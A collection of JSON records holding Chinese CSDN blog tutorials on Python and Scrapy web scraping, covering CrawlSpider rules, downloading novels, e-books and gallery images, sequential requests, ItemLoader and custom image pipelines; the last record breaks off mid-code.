{"timestamp": "2018_08_14_11_12_27", "desc": "重点在于CrawlSpider的学习！！！！！！！！！！！！！\n\n\n\n**通过前面的学习我们可以进行一些页面的简单自动话爬取，对于一些比较规则的网站，我们似乎可以用Spider类去应付，可是，对于一些较为复杂或者说链接的存放不规则的网站我们该怎么去爬取呢，接下来的爬虫就是要解决这个问题，而且还可以高度的自动化爬取链接和链接内容**\n\n\nCrawlSpider类，是建立爬虫的另外一个类。\n\n*（顺便说一下，我们可以继承四种类来建立我们的scrapy爬虫，他们是：Spider类，CrawlSpider类， CSVFeedSpider类和XMLFeedSpider类，今天我们讲的就是CrawlSpider类建立的爬虫）*\n\n\nCrawlSpider类通过一些规则（rules），使对于链接（网页）的爬取更具有通用性，换句话说，CrawlSpider爬虫为通用性的爬虫，而Spider爬虫更像是为一些特殊网站制定的爬虫。\n\n那我们开始正式的讲解一下CrawlSpider爬虫。。。。\n\n\n\n首先我们建立一个爬虫工程：\n\n                      scrapy startproject crawlspider\n\n\n这个我们很熟悉，接下来创建一个CrawlSpider爬虫\n\n    scrapy genspider -t crawl Crawlspider domain.com\n\n\n注意上面，我们比Spider爬虫建立时多了一个’-t crawl’,这是值爬虫的类 \n这样以后我们就可以在我们的spiders文件中找到这个爬虫\n\n\n\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\n\n\nclass CrawlspiderSpider(CrawlSpider):\n    name = 'crawlspider'\n    allowed_domains = ['domain.com']\n    start_urls = ['http://domain.com/']\n\n    rules = (\n        Rule(LinkExtractor(allow=r'Items/'), callback='parse_item', follow=True),\n    )\n\n    def parse_item(self, response):\n        i = {}\n        #i['domain_id'] = response.xpath('//input[@id=\"sid\"]/@value').extract()\n        #i['name'] = response.xpath('//div[@id=\"name\"]').extract()\n        #i['description'] = response.xpath('//div[@id=\"description\"]').extract()\n        return i\n\n上面是打开爬虫后，自动生成的一段代码，这段代码可以说基本上对于CrawlSpider爬虫的结构有一个构造，我们看到，有一个rules属性，还有这个爬虫继承的类是CrawlSpider，这两点就是与前几篇讲的Spider爬虫的区别。其中rules属性使这个爬虫的核心\n\n所以我们在开始讲我们的实战项目之前我们应该先讲一下这个rules属性。 \nrules属性由几个Rule对象构成，而Rule对象定义了提取链接等操作的规则\n\n那么Rule的构造又是怎样的呢？ \nRule对象有六个属性，他们分别是：\n\n\nLinkExtractor(…)，用于提取response中的链接\ncallback=‘str’，回调函数，对提取的链接使用，用于提取数据填充item\ncb_kwargs，传递给回调函数的参数字典\nfollow=True/False，对提取的链接是否需要跟进\nprocess_links，一个过滤链接的函数\nprocess_request，一个过滤链接Request的函数 \n上面的参数除了LinkExtractor外其它都是可选的，且当callback参数为None时，我们称这个rule为一个‘跳板’，也就是只下载页面，并不进行任何行为，通常作翻页功能\n\n\n我们需要解释主要是LinkExtractor参数和follow参数：\n\n一、LinkExtractor参数，明显是用来提取链接的。那么他是怎么来定义提取链接的规则的呢？它有十个参数，用来定义提取链接的规则，分别是： \n 1. allow=‘re_str’:正则表达式字符串，提取response中符合re表达式的链接。 \n 2. deny=‘re_str’：排除正则表达式匹配的链接 \n 3. restrict_xpaths=‘xpath_str’：提取满足xpath表达式的链接 \n 4. restrict_css=‘css_str’:提取满足css表达式的链接 \n 5. allow_domains=‘domain_str’:允许的域名 \n 6. deny_domains=‘domain_str’：排除的域名 \n 7. tags=‘tag’/[‘tag1’,’tag2’,…]：提取指定标签下的链接，默认会从a和area标签下提取链接 \n 8. attrs=[‘href’,’src’,…]：提取满足属性的链接 \n 9. unique=True/False：链接是否去重 \n 10.process_value：值处理函数，优先级要大于allow \n 以上的参数可以一起使用，以提取同时满足条件的链接\n\n二、follow参数： \n为Boolean值，用于是否跟进链接的处理，在callback为None时，默认是跟进链接的，值为True；当callback不为空时，默认是False的，不跟进链接。当然我们可以根据需要赋值，\n\n 那么，什么叫跟进，什么叫不跟进呢？\n 就是你前面定义的规则对于已经提取到的链接的页面是不是在进行一次提取链接。\n\n\n好！那么rules到底是怎么工作的呢？ \n这样的，对于Rule提取的链接会自动调用parse函数，并返回该链接的response，然后将这个response给callback回调函数，通过回调函数的解析对item进行填充\n\n对了，CrawlSpider爬虫还有一个parse_start_url()方法，用于解析start_urls中的链接页面，这个方法一般用于有跳板的爬虫中，用于对首页的解析\n\n说了那么多，我们来说说我们的爬虫项目。用CrawlSpider爬虫，爬取整站的小说\n\n我们的目标网站是：笔趣看小说网 \n这是一个盗版小说网站，只能在线观看，不能下载。 \n首页是这样的： \n \n\n\n整个首页的内容就是上面的样子，那我们的目标就是提取整个首页的所有的小说\n\n首先我们要创建一个CrawlSpider爬虫，创建步骤上面有。 \n先贴代码，再解释：\n\n\n\n# -*- coding: utf-8 -*-\nimport scrapy,re\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom crawlspider.items import CrawlspiderItem\n\n\nclass CrawlspidersSpider(CrawlSpider):\n    name = 'CrawlSpiders'\n    allowed_domains = ['sbiquge.com']\n    start_urls = ['https://www.sbiquge.com/biqukan/']\n\n    rules = (\n        Rule(LinkExtractor(allow=\"/\\d+?_\\d+?/\",unique=True),callback='parse_item',follow=False),\n        # 注意使用restricted_xpath提取链接的时候只能到标签就好了，千万不要到具体的标签属性，那叫画蛇添足。\n        # 这个rule实例有callback属性，那么它就是从所有下载到的response里面提取链接，并下载链接内容由回调函数处理数据\n    )\n    def parse_item(self, response):\n\n        chap_list = response.xpath('.//*[@class=\"listmain\"]/dl/dd')\n        for chapter in chap_list:\n            novel_name = chapter.xpath('//*[@id=\"book\"]/div[1]/div/a[2]/text()').extract_first()\n            chapter_name = chapter.xpath('./a/text()').extract_first()\n            chapter_link = chapter.xpath('./a/@href').extract_first()\n            if chapter_name:\n                item = CrawlspiderItem(chapter_title=chapter_name,novel_name=novel_name)\n                url = response.urljoin(chapter_link)\n                request = scrapy.Request(url=url,callback=self.parse_body)\n                request.meta['key'] = item\n                yield request\n\n    def parse_body(self,response):\n        item = response.meta['key']\n        content_list = response.xpath('.//*[@id=\"content\"]').re('([\\u4e00-\\u9fa5]|<br>)+?') # 匹配到的是一个列表\n        # 利用re直接匹配小说的汉字内容.正则可以匹配标签下的任何内容，这样我们可以提取我们想要的数据\n        content_str = ''.join(content_list)\n        content = re.sub('<br><br>','\\n  ',content_str)\n        # 对匹配的章节进行分段\n        item['content'] = content\n        yield item\n\n\n\n\n\n上面重点内容都是有注释的，如果有看不懂的地方，看一下我前面几篇文章，就可以了。 \n这样的经过上面我们填充的item中就有了小说的名字和小说的章节标题及内容了\n\n接下来就是如何将小说存进对应小说文件的，我们可以选择动态的创建文件的方式（不难的） \n在pipelines.py文件中\n\n\n\nclass CrawlspiderPipeline(object):\n    def process_item(self, item, spider):\n        novel = '{}.txt'.format(item['novel_name'])\n        # 动态创建小说的文件\n        self.file = open(novel, 'a')\n        self.file.write(item['chapter_title']+'\\n'+item['content'])\n        self.file.close()\n\n至于其他几个文件中的代码，和前面几篇的是一样的，有点基础的你应该是不用要的把！ \n这样的话，我们就可以爬取整个网站的小说了。这是我的成果： \n \n\n\n我只爬取了一点点就停下来了，另外稍微改写一下代码，就爬取到了图一所有小说的名字。 \n对了，如果你想让程序停下来就Ctrl+C哦！，两次呀。", "time": "2018_08_14_11_12_27", "link": "https://blog.csdn.net/killeri/article/details/80255500", "title": "scrapy进阶（CrawlSpider爬虫__爬取整站小说）"}
{"timestamp": "2018_08_14_11_12_27", "desc": "Scrapy框架\n\n(本文只做学习使用,请勿他用)\n\n\n\n1.需求工具 pycharm  小说网的域名 (www.qisuu.com)\n\n第一步—–创建文件\n\n\n\n创建成功后显示如图:\n\n\n\n\n\n第二步——将创建在桌面上的scrapy文件用pycharm打开:\n\n\n\n这是创建成功后在pycharm中的显示\n\n\n\npycharm左下角打开 Terminal\n\n\n\n打开后如图 我第一次键入了一条命令  提示爬虫名字不能和项目名称一样,更改后再运行..成功建立爬虫文件 booksspider\n\n\n\n创建爬虫文件命令:    scrapy+ genspider+ 蜘蛛名称 +网站域名\n\n\n\n\n\n创建成功后,出现爬虫文件:\n\n\n\n\n\n接下来,就可以在爬虫文件中写爬虫代码了\n\n第三步——–编写爬虫代码\n\n\n\n1.红框框起来的头部 有一个是自带的,我提前 引用了几个 接下来我需要用到的 功能模块在这里就不再详细解释模块功能,下文用到后再解释.\n\n2.椭圆里面的内容 填写你爬取开始的页面URL,这里是自动生成的,一般是不正确的,需要自己打开要爬取的初始页,将URL复制到这里.\n\n\n\n\n\n3.代码思路\n\n1)请求导航条上的每个按钮对应的页面 \n 2)分别解析每个页面的电子书列表(主要获得电子书的详情url) \n 3)请求详情url,解析电子书的详细信息(书名,封面,评分,大小…下载地址) \n 4)根据下载地址下载电子书到本地\n\n获取导航栏文字及链接\n\n    def parse(self, response):\n        a_list = response.xpath(\"//div[@class='nav']/a[@target='_blank']\")\n        for a in a_list:\n            # 分类名称\n            category_name = a.xpath(\"text()\").extract_first(\"\")\n            # 拼接完整的分类url\n            category_url = urlparse.urljoin(response.url, a.xpath(\"@href\").extract_first(\"\"))\n            # 将分类地址转发给downloader下载并将结果传给parse_books_list\n            # meta:专门用来传递参数,类型是字典\n            yield scrapy.Request(\n                url=category_url,\n                callback=self.parse_books_list,\n                meta={\"category_name\": category_name, }\n            )\n\n获取每本书链接\n\ndef parse_books_list(self, response):\n        href_list = response.xpath(\"//div[@class='listBox']/ul/li/a/@href\").extract()\n        for href in href_list:\n            list_href = urlparse.urljoin(response.url, href)\n            yield scrapy.Request(\n                url=list_href,\n                callback=self.parse_books_detail,\n                meta=response.meta,\n                # meta={\"category_name\": response.meta['category_name'],}\n            )\n        all_pages = response.xpath(\"//select[@name='select']/option/@value\").extract()\n        for page in all_pages:\n            detail_url = urlparse.urljoin(response.url, page)\n            yield scrapy.Request(\n                url=detail_url,\n                callback=self.parse_books_list,\n                meta=response.meta\n            )\n\n进入书本详细页 获取书本详细信息及 下载链接 封面链接\n\ndef parse_books_detail(self, response):\n        info_div = response.xpath(\"//div[@class='detail_right']\")\n        title = info_div.xpath(\"h1/text()\").extract_first(\"\")\n        li_list = info_div.xpath(\"ul/li\")\n        size = li_list[2].xpath(\"text()\").extract_first(\"\")\n        size = size.replace(u\"文件大小：\", \"\").strip()\n        date_time = li_list[4].xpath(\"text()\").extract_first(\"\")\n        date_time = date_time.replace(u\"发布日期：\", \"\").strip()\n        user = li_list[6].xpath(\"a/text()\").extract_first(\"\")\n        download_times = li_list[1].xpath(\"text()\").extract_first(\"\")\n        download_times = download_times.replace(u\"下载次数：\", \"\").strip()\n        book_degree = li_list[7].xpath(\"em/@class\").extract_first(\"\")\n        book_degree = book_degree.replace(\"lstar\", \"\").strip()\n        download_url = response.xpath(\"//a[@class='downButton']/@href\")[1].extract()\n        img_url = response.xpath(\"//div[@class='detail_pic']/img/@src\").extract_first(\"\")\n        img_url = urlparse.urljoin(response.url, img_url)\n        category_name = response.meta['category_name']\n        print title, user, date_time, category_name\n\n        item = BooksItem()\n        item['title'] = title\n        item['size'] = size\n        item['date_time'] = date_time\n        item['user'] = user\n        item['download_times'] = download_times\n        item['book_degree'] = book_degree\n        # 小说要以GBK格式进行存储\n        ########################\n        item['download_url'] = [u\"%s\" % download_url]\n        item['img_url'] = [img_url]\n        ########################注意以列表方式存储\n        item['category_name'] = category_name\n        yield item\n\n\n\n\n第四步——设置item  /与存储有关\n\n\n\n将需要存储的信息写入,如图所示:\n\n\n\n\n\n第五步——配置settings /与下载有关\n\n打开settings,找到红方框中代码,原本是被注释掉的,将 ITEM_PIPELINES{} 解注释.原本就有的内容注释掉,另外添加两条与下载图片与文本的代码. 最后,在ITEM_PIPELINES{}下面键入四行代码,分别为图片和文本的下载链接与存储路径\n\n\n\n\n\n第六步——在Terminal中输入运行命令\n\n\n\nscrapy+crawl+爬虫名称\n\n\n\n运行后就会出现这个啦,图片和文字全部存入这两个文件夹中\n\n\n\n\n\n以上内容为 比较粗糙,因为本人也不太熟,仅做参考.懒癌犯了~ 以后完善", "time": "2018_08_14_11_12_27", "link": "https://blog.csdn.net/han_yanlong/article/details/77073378", "title": "Scrapy框架爬取详细步骤"}
{"timestamp": "2018_08_14_11_12_27", "desc": "其实很多编程语言都可以做爬虫，例如java、c#、php等等甚至excel都可以抓网页的图表，那么为什么我们要用Python呢？它简单、便捷，而且有好多库可以选择，可以说python是写爬虫的首选了！\n\n今天就来带大家写一个简单而又完整的爬虫，我们来抓取整站的图片的，并且保存到电脑上！\n\n\n\n\n\n准备工作\n\n工具：Python3.6、pycharm\n\n库：requests、re、time、random、os\n\n目标网站：妹子图（具体url大家自己去代码里看。。。）\n\n\n\n\n\n在写代码之前\n\n在我们开始写代码之前，要先对网站进行分析，重点有这个几个地方：\n\n1、先判断网页是否静态网页，这个关系我们采用的爬虫手段！\n\n简单的说，网页中的内容，在网页源代码中都可以找到，那么就可以断定，这个网站是静态的了；如果没有找到，就需要去开发者工具中查找，看看是抓包呢还是分析js结构或者其他的方式。\n\n2、看看网页的结构，大致清楚抓取目标数据，需要几层循环，每次循环的方式，以及是否保证没有遗漏！\n\n3、根据网页源代码来决定采用的匹配方式\n\n一般来说，正则表达式是处理字符串最快的方式，但是在爬虫中它的效率并不是很高，因为它需要遍历整个html来匹配相关内容，如果网页源代码比较规整的话，建议采用bs4或者xpath等等解析网页结构的方式比较好！\n\n当然，今天我们是基础向的爬虫，就用正则表达式了，毕竟正则是必须掌握的内容！\n\n那么，具体怎么写爬虫代码呢~？简单的举例给大家说下：\n\n如果是手工操作的话，大概是这个流程\n\n打开主页==>选择一个分类==>选择一个图集==>依次选择图片==>右键保存==>重复以上保存其他图片\n\n那么这个过程放到代码中呢，它的结构大概是这样：\n\n访问主页url==>找到并循环所有分类==>创建分类文件夹==>访问分类url==>找到页码构建循环分类所有页==>循环页面所有图集==>创建图集文件夹==>找到图集内所有图片url==>保存到对应文件夹\n\n好了，思路也有了，那就废话不多说了，我们来写代码吧~！\n\n\n\n\n\n开始写代码\n\n首先是导入上述的各种库，没有的需要安装一下！然后写入以下几行代码获取网页源代码看看是否有反爬：\n\n\n\nimport requests\nimport time\nimport random\nimport re\nimport os\n\n\nurl = 'http://www.meizitu.com/'\nhtml = requests.get(url)\nhtml.encoding = 'gb2312'\n\n\n如果能顺利打印出源代码且和网页右键查看的源代码一致，那么可以判定该网站基本没有反爬了！\n\n第16行代码的含义是给html设定编码格式。因为Python3默认是utf-8,如果网站不是这个编码格式的话，会出现乱码，所以我们直接指定一下。\n\n接下来呢，就是找到所有分类的名字和url了，来看看网页中和源代码中，它的位置在哪\n\n\n\n\n\n全部在a标签的属性中，那么我们可以用一行代码获取了\n\n\n\ninfos = re.findall(r'a href=\"(http://www.meizitu.com/.*?html)\" target=\"_blank\" title=\"(.*?)\" ',html.text)\n\n这里用正则匹配，2个括号中的内容就是我们需要的url和名字了，然后开始构建循环遍历所有的分类\n\n\n\n上一步取出的infos是列表，而且每一个元素都是一个元组，格式为（url，名字），所有我们用2个元素去遍历infos，来获取我们需要的内容，先打印下看看结果是否正确！\n\n这里先不创建文件夹，先进行下一步，访问分类的url，然后开始构建分类中的页码吧！分析网页发现，所有的页码都在下方，但是还是稍有不同：没有当前页、多了下一页和末页\n\n\n\n\n\n由于存在图集不足一页的情况（上述源代码就不会出现），所以我们这么处理循环\n\n\n\n19-21行获取分类的源代码，22行获取所有页码的url，然后用set（）函数去重，再新建一个空列表，将分类的url加进去，注意，元组是不能用append（）方法添加到列表中的，所以要先将set元组转化为列表然后分别重新拼接列表内所有的url，在将2个列表相加的方式合并为一个列表！这样我们就得到了分类下所有翻页页面的url\n\n\n\n循环所有的url，获取所有图集的url列表，27行没有用encoding指定编码是因为这里我不需要取到中文的内容，所以简写了一下！终于该取图片了！\n\n\n\n图集的title和图集内所有图片的url都取到了！其实到这里就已经完成了爬虫的80%了！剩下的20%就是保存图片到本地，这里就不多说了，给大家提供2个代码片段，一个是新建文件夹并判断是否存在，一个是剔除字符串内不符合命名要求的字符\n\n\n\npath = 'E://python/mn/meizitu/%s/'%sor#路径\nif os.path.exists(path):#判断路径及文件夹是否存在，不存在即创建\n    pass\nelse:\n    os.mkdir(path)\n\n\n\n\ndef new_title(title):\n    rstr = r\"[\\/\\\\\\:\\*\\?\\\"\\<\\>\\|]\"  # '/ \\ : * ? \" < > |'\n    new_title = re.sub(rstr, \"_\", title)  # 替换为下划线\n    return new_title\n\n\n\n最终完整代码和运行效果\n\n\n\n在请求中加入了时间模块的暂停功能，不加入的话可能会被网页拒绝访问！\n\n在最后请求图片地址的时候，需要加入UA来告诉服务器你是浏览器而不是脚本，这个是最常用的反爬手段了\n\n\n\n#author:云飞\n#QQ群542110741\nimport requests\nimport time\nimport random\nimport re\nimport os\n\ndef new_title(title):\n    rstr = r\"[\\/\\\\\\:\\*\\?\\\"\\<\\>\\|]\"  # '/ \\ : * ? \" < > |'\n    new_title = re.sub(rstr, \"_\", title)  # 替换为下划线\n    return new_title\n\nurl = 'http://www.meizitu.com/'\nhtml = requests.get(url)\nhtml.encoding = 'gb2312'\ninfos = re.findall(r'a href=\"(http://www.meizitu.com/.*?html)\"  target=\"_blank\" title=\"(.*?)\" ',html.text)\ni = 1\nfor sor_url,sor in infos:\n    sor = new_title(sor)\n    path = 'E://python/mn/meizitu/%s/'%sor#路径\n    if os.path.exists(path):#判断路径及文件夹是否存在，不存在即创建\n        pass\n    else:\n        os.mkdir(path)\n    time.sleep(random.random())\n    sor_html = requests.get(sor_url)\n    sor_html.encoding = 'gb2312'\n    atlas = set(re.findall(r\"<li><a href='(.*?html)'>\\d+</a></li>\",sor_html.text))\n    atlas_lis = []\n    atlas_lis.append(sor_url)\n    atlas_lis += [url+'a/'+x for x in list(atlas)]\n    for atla in atlas_lis:\n        atla_html = requests.get(atla).text\n        at_url_lis = re.findall(r'h3 class=\"tit\"><a href=\"(http://www.meizitu.com/.*?html)\"  targe',atla_html)\n        for at_url in at_url_lis:\n            at_html = requests.get(at_url)\n            at_html.encoding = \"gb2312\"\n            atlas_title = ''.join(re.findall(r'<title>(.*?)</title>',at_html.text))\n            atlas_title = new_title(atlas_title)\n            img_path = 'E://python/mn/meizitu/%s/%s/'%(sor,atlas_title)\n            if os.path.exists(img_path):#判断路径及文件夹是否存在，不存在即创建\n                pass\n            else:\n                os.mkdir(img_path)\n            img_urls = re.findall(r'src=\"(http://mm.chinasareview.com/.*?jpg)\" /><br />',at_html.text)\n            k = 1\n            for img_url in img_urls:\n                header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0'}\n                data = requests.get(img_url,headers=header).content#获取图片的二进制格式\n                with open('%s%s'%(img_path,img_url.split('/')[-1]),'wb') as f:\n                    f.write(data)\n                print(\"【正在下载】 {%s}的第%d张图片，一共下载了%d张图片\"%(atlas_title,k,i))\n                i += 1\n                k += 1\n\n\n\n\n下载一段时间后的效果", "time": "2018_08_14_11_12_27", "link": "https://blog.csdn.net/programmer_yf/article/details/81043412", "title": "Python老司机手把手带你写爬虫，整站下载妹子图，一次爽个够！"}
{"timestamp": "2018_08_14_11_12_27", "desc": "scrapy的请求是并发进行的，但是我今天有一个需求是要顺序爬网站上的信息，爬的是搜狗热搜榜的电影、电视剧、动漫、综艺的热搜排行榜，每一个爬前三页。顺序爬取下来然后存到数据库中。 \n\n\n我的解决办法是在setting文件中将scrapy的并发数设置为1，当并发数为1的时候不就是同步了嘛\n\n\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\nCONCURRENT_REQUESTS = 1\n\n这个参数的默认值是16\n\n以下是我的代码：\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'\n}\n\n\nclass Topsougou_Spider(scrapy.Spider):\n    name = 'top_sougou_spider'\n\n    def start_requests(self):\n        reqs = []\n        # 综艺\n        for i in range(1, 4):\n            url = 'http://top.sogou.com/tvshow/all_' + str(i) + '.html'\n            req = scrapy.Request(url=url, headers=headers)\n            reqs.append(req)\n        # 电影\n        for i in range(1, 4):\n            url = 'http://top.sogou.com/movie/all_' + str(i) + '.html'\n            req = scrapy.Request(url=url, headers=headers)\n            reqs.append(req)\n        # 电视剧\n        for i in range(1, 4):\n            url = 'http://top.sogou.com/tvplay/all_' + str(i) + '.html'\n            req = scrapy.Request(url=url, headers=headers)\n            reqs.append(req)\n        # 动漫\n        for i in range(1, 4):\n            url = 'http://top.sogou.com/animation/all_' + str(i) + '.html'\n            req = scrapy.Request(url=url, headers=headers)\n            reqs.append(req)\n        return reqs\n\n    def parse(self, response):\n        item = TopSougouItem()\n        url = response.url\n        print url\n\n执行结果：", "time": "2018_08_14_11_12_27", "link": "https://blog.csdn.net/gpwner/article/details/78362052", "title": "python爬虫<将scrapy的请求设置为同步>"}
{"timestamp": "2018_08_14_11_12_28", "desc": "今天写的是一篇关于ItemLoader的基本用法的一个点睛解释。 \n爬取网站：妹子图上所有的图片。链接可以打不开（直接用你的浏览器输入（www.meizitu.com）） \n首先贴几张图，是网站的首页和详情页的结构 \n \n首页是一个大图的形式呈现 \n \n详情页由很多小的图片组成的类似九宫格的形式\n\n我们的目标就是要爬取首页和详情页（15页）的全部图片\n\n当然，我们在这里肯定要用到我们的新知识，用ItemLoader进行数据的提取和对item的填充。\n\n爬虫类型：CrawlSpider爬虫 \n我们知道用CrawlSpider对网页的翻页是很方便的，直接定义Rule（不包含call参数）就可以实现自动化的翻页了，那么，我们的首页就要用parse_start_url方法进行提取了。\n\n\n\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom scrapy.contrib.loader import ItemLoader\nfrom jj.items import JjItem\n\n\nclass CrawlspiderSpider(CrawlSpider):\n    name = 'crawlspider'\n    allowed_domains = ['meizitu.com']\n    start_urls = ['http://www.meizitu.com']\n\n    def parse_start_url(self, response):\n        # 用于提取首页的图片\n        Loader = ItemLoader(item=JjItem(),response=response)\n        Loader.add_xpath('picture_urls','.//*[@id=\"picture\"]/p/a/img/@src')\n        # 这样就图取出来了该网页所有的图片链接，也就是图片链接以一个列表的形式收集在一个字段里面\n        yield Loader.load_item()\n\n\n    rules = (\n        Rule(LinkExtractor(restrict_xpaths='.//*[@id=\"subcontent clearfix\"]/div[2]/span/a'),follow=False),\n        # 用于遍历所有的小标题如：颜值控，萌妹等\n        Rule(LinkExtractor(restrict_xpaths='.//*[@id=\"wp_page_numbers\"]/ul/li/a',unique=True),callback='parse_item', follow=False),\n        # 对上一个Rule下载下来的所有页面提取各个小标题的翻页链接（每个小标题好象有15页左右）\n    )\n    # 上面规则提取每个页面的其他页面的链接，并不进行跟进（因为一个页面上就能提取出所有详情页的链接，所以不需要进行跟进）\n    def parse_item(self, response):\n        Loader = ItemLoader(item=JjItem(), response=response)\n        Loader.add_xpath('picture_urls', './/*[@id=\"maincontent\"]/div/ul/li//a/img/@src')\n        # 将一个详情页的所有的图片链接都放到一个字段里面\n        print(Loader.get_collected_values('picture_urls'))\n        yield Loader.load_item()\n\n上面是我们的爬虫程序，很简单。所以用一个parse_start_url,爬取了首页上的所有的图片，并保存到了picture_urls字段中，也就是说，用一个字段保存了一个页面上所有的链接，然后自动调用图片的调度器和下载器对图片进行下载。 \n用parse_item方法对详情页的内容进行了提取，是同样的。在第二个方法里我用ItemLoader的get_collected_values方法获得了进入输入处理器之前的列表，算是做一个测试把。\n\n其他爬虫文件的配置都不难，你们可以通过学习我前面几篇文章的内容自己就可以做出来了。\n\n在这里我们明白了两点内容： \n一、item的一个字段不但接受一个str还可以接受一个列表（实际上，一个item字段可以接受任何python类型的数据，不只上面两个） \n二、图片链接字段只接受一个列表（这与一有点冲突，记住就好了。） \n在前面的内容，我还强调了说，图片链接字段只接受列表（即使只有一个图片），这里就讲明了原因，在某种程度上是为了ItemLoader服务的。\n\n这里和前面的item不一样的在于，前面几篇的item一个字段往往只接受了一个值，通过循环的方式每次返回一个值，而这里一个item字段接受了一个列表的数据。\n\n进过上面的程序的运行，我们的成果给祢看一下呀！ \n\n\n注意：本博客不涉黄！！！！！！！！！！！！！！！！！！ \n关注一波？\n\n这个程序只是对一个页面上的主体图片进行了提取，那 \n \n这些链接的内容该怎么提取呢，其实很简单。我给一个思路： \n增加一个Rule((allow=’http://www.meizitu.com/a/\\d+?.html’,unique=True),callback=”,follow=True) \n这样我们就能够提取到所有已经下载到的页面的如正则相匹配的链接并下载页面内容，然后在用回调函数解析页面就可以了！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/killeri/article/details/80284049", "title": "scrapy进阶（爬取整站图片）——Itemloader作用机制点睛"}
{"timestamp": "2018_08_14_11_12_28", "desc": "写博客只是为了分享一些我踩过的坑，有些坑真的很让人奔溃，所以写\n\n上一篇我们讲了用scrapy的原生管道下载图片，这篇来讲讲用自定义的管道来下载图片（当然也是在继承了原生管道后对方法的重定义）\n\n什么是scrapy的管道（pipelines）： \n讲了这么多我还没有具体讲一下什么是scrapy里面的管道，按这里我就具体讲一下什么是pipelines，pipelines有什么作用\n\n在一个工程里面，在pipelines.py文件中定义我们的管道，其实一个管道实际上就是一个类，而这个类定义了一些方法（属性），用来处理我们传进类（管道）中的数据，在处理完以后，再返回被处理以后的数据。那么，多个管道合用，当然就是讲一个数据先后传进多个管道中处理，最后输出数据了。\n\n下面我们实现的这个工程就实现了多个管道分别处理一个item\n\n实战项目：\n\n        用scrapy爬取豆瓣top250电影的影名，导演等信息还有海报（海报是一个图片，需要下载）\n        *很明显，这次的重点是图片和文件的内容的双重爬取，也就是我们要处理文本和图片，就需要用到我们的两个管道，图片处理管道MypipeimageslinePipeline和文本处理管道MyitemPipeline*\n\n\n这篇要结合前面的两篇来讲：\n\n爬取豆瓣文本的scrapy工程 \n用原生scrapy管道爬取图片\n\n首先我们用spider爬取出我们要的文本和图片的链接，这个我贴上我的代码，不过你最好自己去独立实现，这个不涉及很多，主要只是xpath和正则表达式的应用，具体的代码解释看第一篇文章，我会在这篇里面新增的代码进行注释\n\n\n\n# 大部分的代码解释在*爬取豆瓣文本的scrapy工程*，这里进行的是对新增代码的注释\n\nimport scrapy\nfrom mypipeline.items import MypipelineItem\nfrom scrapy.selector import Selector\n\n\nclass MypipespiderSpider(scrapy.Spider):\n    name = 'mypipespider'\n    allowed_domains = ['douban.com']\n\n    start_urls = [\n        'https://movie.douban.com/top250?start=0&filter='\n    ]\n\n    def parse(self, response):\n        lis = response.xpath('.//div[@class=\"article\"]/ol[@class=\"grid_view\"]/li')\n        for li in lis:\n            item = MypipelineItem()\n            title = li.xpath('.//div[@class=\"hd\"]/a/span/text()').extract_first()\n            director = li.xpath('.//div[@class=\"bd\"]/p[1]/text()').re('([\\u4e00-\\u9fa5]?·?[\\u4e00-\\u9fa5]+?)\\s')[0]\n            time_list = li.xpath('.//div[@class=\"bd\"]/p[1]/text()').re('\\d+?')\n            time = ''.join(time_list)\n            rate = li.xpath('.//span[@class=\"rating_num\"]/text()').extract_first()\n            quote = li.xpath('.//p[@class=\"quote\"]/span/text()').extract_first()\n            detail_link = li.xpath('.//div[@class=\"hd\"]/a/@href').extract_first()\n            picture_link = li.xpath('.//div[@class=\"pic\"]/a/img/@src').extract()\n            # 爬取图片的链接，注意：用数组的形式储存链接\n            if quote:\n                item['title'] = title\n                item['director'] = director\n                item['time'] = time\n                item['rate'] = rate\n                item['quote'] = quote\n                item['my_images_urls'] = picture_link\n                # 将链接储存到item里面\n            else:\n                item['title'] = title\n                item['director'] = director\n                item['time'] = time\n                item['rate'] = rate\n                item['my_images_urls'] = picture_link\n            request = scrapy.Request(url=detail_link, meta={\"key\": item}, callback=self.parse_detail)\n            yield request\n        next_page = response.xpath('//span[@class=\"next\"]/a/@href').extract_first()\n        if next_page is not None:\n            url = response.urljoin(next_page)\n            yield scrapy.Request(url, callback=self.parse)\n\n    def parse_detail(self, response):\n        item = response.meta['key']\n        sele = Selector(response)\n        short = sele.xpath('.//div[@id=\"link-report\"]/span[1]/text()').extract_first()\n        item['short'] = short\n        yield item\n\n用原生scrapy爬取图片这篇讲过当图片链接存在特定的键后，启动爬虫会自动调用scrapy的调度器和下载器对图片链接指向的图片进行下载并存在相应的文件夹\n\n接下来来讲一下pipelines.py文件中的管道（类） \n要想定义自己的imagespipeline，那首先要继承原生的imagespipeline\n\n\n\nfrom scrapy.pipelines.images import ImagesPipeline\n\nclass MypipeimageslinePipeline(ImagesPipeline):\n    #继承类\n    def get_media_requests(self, item, info):\n        for images_url in item['my_images_urls']:\n            yield scrapy.Request(images_url)\n            # 返回图片链接所指向的response\n    def item_completed(self, results, item, info):\n        images_path = [x['path'] for ok,x in results if ok]\n        # results是之前get_media_requests返回的，具体看下面\n        if not images_path:\n            raise DropItem(\"item contains no images\")\n        item['image_path'] = images_path\n        # 将图片的链接存储在item里面\n        return item\n        # return item 必不可少，用来返回item以便其它管道调用item进行处理\n\n上面的results是由get_media_requests方法返回的一个两个元素的元组列表，每个元组里面包含了一个布尔值和一个字典。实例如下：\n\n    [(True,\n        {'checksum':'图片的MD5hash',\n        'url':'图片的链接',\n        'path':'图片的储存路径',}\n        ),\n        ...\n    (False,\n        Failure())]\n\n\n上面图片下载成功就是True，失败就是False。\n\n\n\nimages_path = [x['path'] for ok,x in results if ok]\n# 这一句就是用来提取图片的存储路径的\n\n以上我们自定义了imagepipeline，这个管道用来处理图片，接下来我们定义文本处理的管道\n\n\n\nclass MyitemPipeline(object):\n    def __init__(self):\n        self.file = open('movie_and_details.csv','wb')\n# 将文本存储到文件中\n    def process_item(self, item, 